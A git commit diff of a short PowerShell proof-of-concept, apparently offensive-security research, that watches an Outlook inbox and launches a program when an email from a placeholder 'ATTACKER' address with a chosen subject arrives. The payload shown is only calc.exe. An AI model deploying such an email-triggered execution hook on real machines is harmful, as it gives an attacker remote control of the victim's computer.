ae07d1b06c893e4df43a479009768a06393caa3d
enigma0x3 <matthew@webnelson.net>
2014-10-13 16:27:52 -0400

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -4,5 +4,5 @@ $outlook = new-object -com outlook.application;
 $ns = $outlook.GetNameSpace("MAPI");
 $inbox = $ns.GetDefaultFolder($olFolderInbox)
 $inbox.items | foreach { 
-if($_.SenderEmailAddress -match "nelsomas@umail.iu.edu" -and $_.subject -match "Test")
+if($_.SenderEmailAddress -match "ATTACKER@EMAILADDRESS.COM" -and $_.subject -match "CUSTOMSUBJECT")
 {Invoke-Item C:\Windows\System32\calc.exe}}}
